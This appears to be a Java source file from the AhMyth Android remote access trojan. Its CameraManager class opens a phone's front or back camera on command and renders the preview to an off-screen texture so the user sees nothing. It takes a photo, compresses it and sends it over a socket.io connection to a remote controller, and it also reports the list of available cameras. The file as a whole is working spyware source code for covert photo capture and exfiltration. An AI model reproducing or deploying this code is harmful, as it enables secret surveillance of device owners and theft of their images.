package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Parameters;
import android.os.Build;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class CameraManager {

    private Context context;
    private Camera camera;

    public CameraManager(Context context) {
        this.context = context;
    }

    private boolean hasCameraPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        } else {
            return context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA);
        }
    }

    public void startUp(int cameraID) {
        if (!hasCameraPermission()) {
            JSONObject resp = new JSONObject();
            try {
                resp.put("image", false);
                resp.put("error", "CAMERA permission not granted");
            } catch (JSONException e) {}
            IOSocket.getInstance().getIoSocket().emit("x0000ca", resp);
            return;
        }

        try {
            camera = Camera.open(cameraID);
            Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();

            camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    releaseCamera();
                    sendPhoto(data);
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
            JSONObject resp = new JSONObject();
            try {
                resp.put("image", false);
                resp.put("error", "Camera error: " + e.getMessage());
            } catch (JSONException ee) {}
            IOSocket.getInstance().getIoSocket().emit("x0000ca", resp);
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            byte[] jpegData = bos.toByteArray();

            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", jpegData);

            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (JSONException e) {
            e.printStackTrace();
            JSONObject resp = new JSONObject();
            try {
                resp.put("image", false);
                resp.put("error", "Image error: " + e.getMessage());
            } catch (JSONException ee) {}
            IOSocket.getInstance().getIoSocket().emit("x0000ca", resp);
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
            } catch (Exception e) {}
            camera.release();
            camera = null;
        }
    }

    public JSONObject findCameraList() {
        JSONObject cameras = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
                cameras.put("camList", false);
                cameras.put("list", list);
                return cameras;
            }

            cameras.put("camList", true);

            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                JSONObject jo = new JSONObject();
                switch (info.facing) {
                    case Camera.CameraInfo.CAMERA_FACING_FRONT:
                        jo.put("name", "Front");
                        break;
                    case Camera.CameraInfo.CAMERA_FACING_BACK:
                        jo.put("name", "Back");
                        break;
                    default:
                        jo.put("name", "Other");
                        break;
                }
                jo.put("id", i);
                list.put(jo);
            }

            cameras.put("list", list);
            return cameras;
        } catch (JSONException e) {
            e.printStackTrace();
            try {
                cameras.put("camList", false);
                cameras.put("error", "CameraList error: " + e.getMessage());
            } catch (JSONException ee) {}
            return cameras;
        }
    }

}